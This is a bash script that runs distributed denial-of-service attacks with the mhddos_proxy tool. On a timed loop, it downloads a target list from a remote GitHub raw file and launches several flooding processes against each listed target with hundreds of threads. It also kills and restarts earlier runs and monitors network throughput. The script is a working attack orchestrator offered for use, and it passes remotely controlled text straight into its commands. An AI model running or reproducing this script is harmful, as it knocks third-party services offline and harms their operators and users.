#!/bin/bash

# More safety, by turning some bugs into errors.
# Without `errexit` you don’t need ! and can replace
# PIPESTATUS with a simple $?, but I don’t do that.
set -o errexit -o pipefail -o noclobber -o nounset

# -allow a command to fail with !’s side effect on errexit
# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo 'I am sorry, `getopt --test` failed in this environment. Please, install enhanced getopt.'
    exit 1
fi

OPTIONS=r:t:p:s:d
LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,debug

# -regarding ! and PIPESTATUS see above
# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    # e.g. return value is 1
    #  then getopt has complained about wrong arguments to stdout
    exit 2
fi

# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

refresh_interval="1h"
thread_count="500"
process_count="2"
stats_interval="30"
debug=""

# now enjoy the options in order and nicely split until we see --
while true; do
    case "$1" in
        -r|--refresh-interval)
            refresh_interval="$2"
            shift 2
            ;;
        -t|--thread-count)
            thread_count="$2"
            shift 2
            ;;
        -p|--process-count)
            process_count="$2"
            shift 2
            ;;
        -s|--stats-interval)
            stats_interval="$2"
            shift 2
            ;;
        -d|--debug)
            debug="true"
            shift
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "$1"
            echo "Programming error"
            exit 3
            ;;
    esac
done

# Just in case kill previous copy of mhddos_proxy
pkill -f runner.py
pkill -f ./start.py
pkill -f ifstat

# Restart attacks and update targets every $refresh_interval
while true
do
  # Get number of targets in runner_targets
  number_of_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")

  echo -e "\nNumber of targets: $number_of_targets\n"

  # Launch multiple mhddos_proxy instances with different targets.
  for (( i=1; i<=number_of_targets; i++ ))
  do
    target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")

    cd ~/mhddos_proxy || exit

    for (( j=1; j<=process_count; j++ ))
    do
      echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 0 $debug&"
      python3 runner.py $target_command -t $thread_count -p 25200 --rpc 0 $debug&
    done
  done

  ifstat -i eth0 -t -b $stats_interval/$stats_interval&

  echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"

  sleep $refresh_interval
  clear

  echo -e "\nDDoS is RESTARTING. Killing old processes..."
  pkill -f runner.py
  pkill -f ./start.py
  pkill -f ifstat
  echo -e "\nDDoS is RESTARTING. Killing old processes... DONE!"

done
